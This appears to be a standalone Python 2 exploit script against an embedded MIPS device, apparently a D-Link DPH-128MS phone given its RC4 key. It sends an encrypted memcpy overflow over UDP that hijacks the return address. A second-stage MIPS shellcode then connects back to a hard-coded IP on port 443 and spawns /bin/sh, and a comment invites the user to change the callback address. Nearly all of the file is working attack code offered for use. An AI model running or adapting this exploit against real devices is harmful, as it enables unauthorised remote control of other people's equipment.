from socket import *
import sys
import time

def rc4crypt(data, key):
    x = 0
    box = range(256)
    for i in range(256):
        x = (x + box[i] + ord(key[i % len(key)])) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    out = []
    for char in data:
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        out.append(chr(ord(char) ^ box[(box[x] + box[y]) % 256]))
    
    return ''.join(out)
    
# memcpy overflow that we need to rc4crypt
payload  = ''.join(['A' for num in xrange(0x1A0)])
payload += '\x00\x00\x00\x08' # s0 file descriptor
payload += '\x10\x00\x00\x00' # s1 buffer for read
payload += 'AAAA' # s2
payload += 'AAAA' # s3
payload += 'AAAA' # s4
payload += 'AAAA' # s5
payload += 'AAAA' # s6
payload += 'AAAA'
payload += '\x00\x40\xfb\x70' # ra
payload += 'AAAA'
payload += ''.join(['B' for num in xrange(0x6C)])
payload += '\x10\x00\x00\x10' # second ra

# Second payload is the code starting at 0x10000000
payload2  = '\x10\x00\x00\x08'
payload2 += '\x00\x00\x00\x00'
payload2 += '/bin'
payload2 += '/sh\x00'
payload2 += '\x24\x0f\xff\xfd'        # li      t7,-3
payload2 += '\x01\xe0\x20\x27'        # nor     a0,t7,zero
payload2 += '\x01\xe0\x28\x27'        # nor     a1,t7,zero
payload2 += '\x28\x06\xff\xff'        # slti    a2,zero,-1
payload2 += '\x24\x02\x10\x57'        # li      v0,4183 ( sys_socket )
payload2 += '\x01\x01\x01\x0c'        # syscall 0x40404

payload2 += '\xaf\xa2\xff\xff'        # sw      v0,-1(sp)
payload2 += '\x8f\xa4\xff\xff'        # lw      a0,-1(sp)
payload2 += '\x24\x0f\xff\xfd'        # li      t7,-3 ( sa_family = AF_INET )
payload2 += '\x01\xe0\x78\x27'        # nor     t7,t7,zero
payload2 += '\xaf\xaf\xff\xe0'        # sw      t7,-32(sp)
payload2 += '\x3c\x0e\x01\xBB'        # lui     t6,0x7a69 ( sin_port = 0x01BB = 443 )
payload2 += '\x35\xce\x7a\x69'        # ori     t6,t6,0x7a69
payload2 += '\xaf\xae\xff\xe4'        # sw      t6,-28(sp)

# ====================  You can change ip here ;) ====================== #
payload2 += '\x3c\x0d\xc0\xa8'        # lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ...
payload2 += '\x35\xad\x0D\x89'        # ori     t5,t5,0x0D6E         ...0D89 ) = 192.168.13.137
# ====================================================================== #

payload2 += '\xaf\xad\xff\xe6'        # sw      t5,-26(sp)
payload2 += '\x23\xa5\xff\xe2'        # addi    a1,sp,-30
payload2 += '\x24\x0c\xff\xef'        # li      t4,-17 ( addrlen = 16 )
payload2 += '\x01\x80\x30\x27'        # nor     a2,t4,zero
payload2 += '\x24\x02\x10\x4a'        # li      v0,4170 ( sys_connect )
payload2 += '\x01\x01\x01\x0c'        # syscall 0x40404

payload2 += '\x24\x0f\xff\xfd'        # li      t7,-3
payload2 += '\x01\xe0\x28\x27'        # nor     a1,t7,zero
payload2 += '\x8f\xa4\xff\xff'        # lw      a0,-1(sp)
#dup2_loop:
payload2 += '\x24\x02\x0f\xdf'        # li      v0,4063 ( sys_dup2 )
payload2 += '\x01\x01\x01\x0c'        # syscall 0x40404
payload2 += '\x20\xa5\xff\xff'        # addi    a1,a1,-1
payload2 += '\x24\x01\xff\xff'        # li      at,-1
payload2 += '\x14\xa1\xff\xfb'        # bne     a1,at, dup2_loop

payload2 += '\x28\x06\xff\xff'        # slti    a2,zero,-1
payload2 += '\x3c\x0f\x2f\x2f'        # lui     t7,0x2f2f
payload2 += '\x35\xef\x62\x69'        # ori     t7,t7,0x6269
payload2 += '\xaf\xaf\xff\xf4'        # sw      t7,-12(sp)
payload2 += '\x3c\x0e\x6e\x2f'        # lui     t6,0x6e2f
payload2 += '\x35\xce\x73\x68'        # ori     t6,t6,0x7368
payload2 += '\xaf\xae\xff\xf8'        # sw      t6,-8(sp)
payload2 += '\xaf\xa0\xff\xfc'        # sw      zero,-4(sp)
payload2 += '\x27\xa4\xff\xf4'        # addiu   a0,sp,-12
payload2 += '\x3c\x05\x10\x00'        # lui     a1,0x1000 a1 = 0x10000000
#payload2 += '\x28\x05\xff\xff'        # slti    a1,zero,-1
payload2 += '\x24\x02\x0f\xab'        # li      v0,4011 ( sys_execve )
payload2 += '\x01\x01\x01\x0c'        # syscall 0x40404
payload2 += '\x00\x00\x00\x00'

print len(payload2)

ip = '192.168.1.236'
port = 9999
address = (ip,port)

payload = rc4crypt(payload, 'DPH-128MS')

data = '#@' + payload

UDPSock = socket(AF_INET, SOCK_DGRAM)
UDPSock.sendto(data, address)

# payload1
response,addr = UDPSock.recvfrom(1024)
print response
time.sleep(1)

# payload2
UDPSock.sendto(payload2, address)

UDPSock.close()
